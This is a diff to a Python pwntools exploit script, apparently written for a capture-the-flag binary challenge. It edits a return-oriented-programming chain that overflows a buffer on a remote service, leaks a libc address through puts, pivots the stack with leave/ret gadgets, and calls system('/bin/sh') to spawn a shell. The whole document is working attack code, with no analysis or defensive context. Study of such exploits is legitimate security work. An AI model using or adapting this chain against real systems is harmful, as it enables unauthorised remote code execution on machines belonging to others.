@@ -14,24 +14,26 @@ y = remote( host , port )
 name = 0x601080
 main = 0x400636
 pop_rdi = 0x400743
+ppr = 0x400741
 pop_rbp = 0x4005a0
 leave_ret = 0x4006d1
 
 
 p = flat(
-    'D' * 0x1d0,
-    main,
+    'D' * 0x200,
     pop_rdi,
     e.got['__libc_start_main'],
     e.plt['puts'],
-    main
+    pop_rbp,
+    name + 0x700 + 0x20,
+    0x400693,
 )
 
 y.sendafter( '?' , p )
 
 p = flat(
     'D' * 0x20,
-    name + 0x1d0 - 8,
+    name + 0x200 - 8,
     leave_ret
 )
 
@@ -47,16 +49,15 @@ log.success('libc -> {}'.format( hex(l.address) ))
 p = flat(
     pop_rdi,
     l.search( '/bin/sh\x00' ).next(),
-    l.symbols['system']
-)
-
-#y.sendafter( '?' , p )
-
-p = flat(
-    'D' * 0x20,
-    name - 8,
+    l.symbols['system'],
+    0,
+    name + 0x700 - 8,
     leave_ret
 )
+
+sleep(1)
+
+y.send( p )
 
 #y.sendafter( '?' , p )
 
